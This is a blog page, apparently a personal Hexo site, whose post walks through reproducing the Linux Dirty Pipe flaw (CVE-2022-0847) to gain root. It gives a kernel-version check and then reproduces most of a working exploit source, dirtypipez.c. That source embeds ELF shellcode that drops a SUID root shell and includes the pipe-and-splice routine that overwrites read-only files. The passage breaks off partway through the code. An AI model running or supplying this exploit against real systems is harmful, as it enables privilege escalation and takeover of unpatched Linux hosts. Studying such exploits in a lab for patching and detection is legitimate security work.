<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-我的第一篇博客" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/21/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="article-date">
  <time class="dt-published" datetime="2025-01-21T13:35:30.000Z" itemprop="datePublished">2025-01-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/21/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">我的第一篇博客</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="cve-2022-0847（复现和深度利用）"><a href="#cve-2022-0847（复现和深度利用）" class="headerlink" title="cve-2022-0847（复现和深度利用）"></a>cve-2022-0847（复现和深度利用）</h1><p>系统为Ubuntu 18.04，内核版本为5.8.0。</p>
<h2 id="一、本地漏洞复现（覆盖系统文件提权）"><a href="#一、本地漏洞复现（覆盖系统文件提权）" class="headerlink" title="一、本地漏洞复现（覆盖系统文件提权）"></a>一、本地漏洞复现（覆盖系统文件提权）</h2><p><strong>目标：验证漏洞存在，通过覆盖<code>/etc/passwd</code>添加特权用户。</strong></p>
<h3 id="步骤1：验证内核版本"><a href="#步骤1：验证内核版本" class="headerlink" title="步骤1：验证内核版本"></a><strong>步骤1：验证内核版本</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -r</span><br></pre></td></tr></table></figure>

<h3 id="步骤2：编写PoC代码"><a href="#步骤2：编写PoC代码" class="headerlink" title="步骤2：编写PoC代码"></a><strong>步骤2：编写PoC代码</strong></h3><h4 id="1-创建文件dirtypipez-c，内容如下："><a href="#1-创建文件dirtypipez-c，内容如下：" class="headerlink" title="1.创建文件dirtypipez.c，内容如下："></a><strong>1.创建文件<code>dirtypipez.c</code>，内容如下：</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// dirtypipez.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// hacked up Dirty Pipe (CVE-2022-0847) PoC that hijacks a SUID binary to spawn</span></span><br><span class="line"><span class="comment">// a root shell. (and attempts to restore the damaged binary as well)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Wow, Dirty CoW reloaded!</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// -- blasty &lt;peter@haxx.in&gt; // 2022-03-07</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* SPDX-License-Identifier: GPL-2.0 */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Proof-of-concept exploit for the Dirty Pipe</span></span><br><span class="line"><span class="comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span></span><br><span class="line"><span class="comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span></span><br><span class="line"><span class="comment"> * file contents in the page cache, even if the file is not permitted</span></span><br><span class="line"><span class="comment"> * to be written, immutable or on a read-only mount.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This exploit requires Linux 5.8 or later; the code path was made</span></span><br><span class="line"><span class="comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span></span><br><span class="line"><span class="comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span></span><br><span class="line"><span class="comment"> * there before, it just provided an easy way to exploit it.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There are two major limitations of this exploit: the offset cannot</span></span><br><span class="line"><span class="comment"> * be on a page boundary (it needs to write one byte before the offset</span></span><br><span class="line"><span class="comment"> * to add a reference to this page to the pipe), and the write cannot</span></span><br><span class="line"><span class="comment"> * cross a page boundary.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Further explanation: https://dirtypipe.cm4all.com/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// small (linux x86_64) ELF file matroshka doll that does;</span></span><br><span class="line"><span class="comment">//   fd = open(&quot;/tmp/sh&quot;, O_WRONLY | O_CREAT | O_TRUNC);</span></span><br><span class="line"><span class="comment">//   write(fd, elfcode, elfcode_len)</span></span><br><span class="line"><span class="comment">//   chmod(&quot;/tmp/sh&quot;, 04755)</span></span><br><span class="line"><span class="comment">//   close(fd);</span></span><br><span class="line"><span class="comment">//   exit(0);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// the dropped ELF simply does:</span></span><br><span class="line"><span class="comment">//   setuid(0);</span></span><br><span class="line"><span class="comment">//   setgid(0);</span></span><br><span class="line"><span class="comment">//   execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], [NULL]);</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> elfcode[] = &#123;</span><br><span class="line">	<span class="comment">/*0x7f,*/</span> <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x3d</span>, <span class="number">0x56</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc6</span>, <span class="number">0x41</span>, <span class="number">0x02</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>,</span><br><span class="line">	<span class="number">0xba</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>,</span><br><span class="line">	<span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>,</span><br><span class="line">	<span class="number">0x3d</span>, <span class="number">0x1c</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc6</span>, <span class="number">0xed</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x5a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3c</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x2f</span>, <span class="number">0x74</span>, <span class="number">0x6d</span>,</span><br><span class="line">	<span class="number">0x70</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xba</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0xba</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x69</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x6a</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x3d</span>, <span class="number">0x1b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>,</span><br><span class="line">	<span class="number">0x3b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3c</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class="line"><span class="comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">prepare_pipe</span><span class="params">(<span class="type">int</span> p[<span class="number">2</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class="line"><span class="comment">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">		<span class="type">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">		write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class="line"><span class="comment">	   leaving the flags initialized) */</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">		<span class="type">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">		read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class="line"><span class="comment">	   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class="line"><span class="comment">	   will be mergeable */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hax</span><span class="params">(<span class="type">char</span> *filename, <span class="type">long</span> offset, <span class="type">uint8_t</span> *data, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">	<span class="comment">/* open the input file and validate the specified offset */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> fd = open(filename, O_RDONLY); <span class="comment">// yes, read-only! :-)</span></span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">	<span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">		perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create the pipe with all flags initialized with</span></span><br><span class="line"><span class="comment">	   PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class="line">	<span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">	prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* splice one byte from before the specified offset into the</span></span><br><span class="line"><span class="comment">	   pipe; this will add a reference to the page cache, but</span></span><br><span class="line"><span class="comment">	   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class="line"><span class="comment">	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class="line">	--offset;</span><br><span class="line">	<span class="type">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* the following write will not create a new pipe_buffer, but</span></span><br><span class="line"><span class="comment">	   will instead write into the page cache, because of 